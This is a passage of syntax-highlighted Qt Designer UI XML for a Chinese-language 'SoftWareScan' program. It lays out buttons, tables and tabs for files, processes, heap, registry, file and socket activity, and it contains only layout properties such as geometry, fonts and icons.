class="name">height</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">font</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>华文楷体<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pointsize</span>&gt;</span>14<span class="tag">&lt;/<span class="name">pointsize</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">italic</span>&gt;</span>false<span class="tag">&lt;/<span class="name">italic</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;autoFillBackground&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">bool</span>&gt;</span>true<span class="tag">&lt;/<span class="name">bool</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;html&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span><span class="symbol">&amp;lt;</span>!DOCTYPE HTML PUBLIC <span class="symbol">&amp;quot;</span>-//W3C//DTD HTML 4.0//EN<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>http://www.w3.org/TR/REC-html40/strict.dtd<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>html<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>head<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>meta name=<span class="symbol">&amp;quot;</span>qrichtext<span class="symbol">&amp;quot;</span> content=<span class="symbol">&amp;quot;</span>1<span class="symbol">&amp;quot;</span> /<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>style type=<span class="symbol">&amp;quot;</span>text/css<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span></span><br><span class="line">p, li &#123; white-space: pre-wrap; &#125;</span><br><span class="line"><span class="symbol">&amp;lt;</span>/style<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/head<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>body style=<span class="symbol">&amp;quot;</span> font-family:&#x27;华文楷体&#x27;; font-size:14pt; font-weight:400; font-style:normal;<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>p align=<span class="symbol">&amp;quot;</span>center<span class="symbol">&amp;quot;</span> style=<span class="symbol">&amp;quot;</span> margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>span style=<span class="symbol">&amp;quot;</span> font-family:&#x27;宋体&#x27;; font-size:12pt; font-style:italic;<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span>文件路径信息<span class="symbol">&amp;lt;</span>/span<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/p<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/body<span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>/html<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTableWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;FileInfo&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">x</span>&gt;</span>0<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">y</span>&gt;</span>60<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">width</span>&gt;</span>591<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">height</span>&gt;</span>191<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTableWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ProcessInfoTable&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">x</span>&gt;</span>780<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">y</span>&gt;</span>10<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">width</span>&gt;</span>281<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">height</span>&gt;</span>181<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QSplitter&quot;</span> <span class="attr">name</span>=<span class="string">&quot;splitter&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">x</span>&gt;</span>610<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">y</span>&gt;</span>10<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">width</span>&gt;</span>161<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">height</span>&gt;</span>271<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;orientation&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">enum</span>&gt;</span>Qt::Vertical<span class="tag">&lt;/<span class="name">enum</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QPushButton&quot;</span> <span class="attr">name</span>=<span class="string">&quot;FileOpen&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">font</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>华文行楷<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pointsize</span>&gt;</span>12<span class="tag">&lt;/<span class="name">pointsize</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>选择文件<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;icon&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">iconset</span> <span class="attr">resource</span>=<span class="string">&quot;SoftWareScan.qrc&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/file.png<span class="tag">&lt;/<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/file.png<span class="tag">&lt;/<span class="name">iconset</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;iconSize&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">width</span>&gt;</span>25<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">height</span>&gt;</span>25<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QPushButton&quot;</span> <span class="attr">name</span>=<span class="string">&quot;StartScan&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">font</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>华文行楷<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pointsize</span>&gt;</span>12<span class="tag">&lt;/<span class="name">pointsize</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>开始<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;icon&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">iconset</span> <span class="attr">resource</span>=<span class="string">&quot;SoftWareScan.qrc&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/start.png<span class="tag">&lt;/<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/start.png<span class="tag">&lt;/<span class="name">iconset</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;iconSize&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">width</span>&gt;</span>25<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">height</span>&gt;</span>25<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QPushButton&quot;</span> <span class="attr">name</span>=<span class="string">&quot;StopThread&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">font</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>华文行楷<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pointsize</span>&gt;</span>12<span class="tag">&lt;/<span class="name">pointsize</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>停止<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;icon&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">iconset</span> <span class="attr">resource</span>=<span class="string">&quot;SoftWareScan.qrc&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/stop.png<span class="tag">&lt;/<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/stop.png<span class="tag">&lt;/<span class="name">iconset</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;iconSize&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">width</span>&gt;</span>25<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">height</span>&gt;</span>25<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QPushButton&quot;</span> <span class="attr">name</span>=<span class="string">&quot;CleanInfo&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">font</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>华文行楷<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pointsize</span>&gt;</span>12<span class="tag">&lt;/<span class="name">pointsize</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>清除信息<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;icon&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">iconset</span> <span class="attr">resource</span>=<span class="string">&quot;SoftWareScan.qrc&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/clean.png<span class="tag">&lt;/<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/clean.png<span class="tag">&lt;/<span class="name">iconset</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;iconSize&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">width</span>&gt;</span>25<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">height</span>&gt;</span>25<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QPushButton&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ProcessStatus&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">font</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">family</span>&gt;</span>华文行楷<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">pointsize</span>&gt;</span>12<span class="tag">&lt;/<span class="name">pointsize</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>进程状态<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;icon&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">iconset</span> <span class="attr">resource</span>=<span class="string">&quot;SoftWareScan.qrc&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/status.png<span class="tag">&lt;/<span class="name">normaloff</span>&gt;</span>:/SoftWareScan/Resources/status.png<span class="tag">&lt;/<span class="name">iconset</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;iconSize&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">width</span>&gt;</span>30<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">height</span>&gt;</span>30<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;widget&quot;</span> <span class="attr">native</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">x</span>&gt;</span>780<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">y</span>&gt;</span>0<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">width</span>&gt;</span>281<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">height</span>&gt;</span>261<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTabWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ApiInfo&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">x</span>&gt;</span>0<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">y</span>&gt;</span>560<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">width</span>&gt;</span>731<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">height</span>&gt;</span>211<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">font</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">family</span>&gt;</span>华文楷体<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">pointsize</span>&gt;</span>14<span class="tag">&lt;/<span class="name">pointsize</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;layoutDirection&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">enum</span>&gt;</span>Qt::LeftToRight<span class="tag">&lt;/<span class="name">enum</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;currentIndex&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">number</span>&gt;</span>0<span class="tag">&lt;/<span class="name">number</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;iconSize&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">size</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">width</span>&gt;</span>25<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">height</span>&gt;</span>25<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Page_heap&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Page_reg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Page_file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Page_socket&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">attribute</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>页<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">attribute</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">widget</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">widget</span> <span class="attr">class</span>=<span class="string">&quot;QTabWidget&quot;</span> <span class="attr">name</span>=<span class="string">&quot;JieHuo&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;geometry&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">x</span>&gt;</span>0<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">y</span>&gt;</span>300<span class="tag">&lt;/<span class="name">y</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">width</span>&gt;</span>1081<span class="tag">&lt;/<span class="name">width</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">height</span>&gt;</span>261<span class="tag">&lt;/<span class="name">height</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rect</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;font&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">font</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">family</span>&gt;</span>华文楷体<span class="tag">&lt;/<span class="name">family</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">pointsize</span>&gt;</span>14<span class="tag">&lt;/<span class="name">pointsize</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 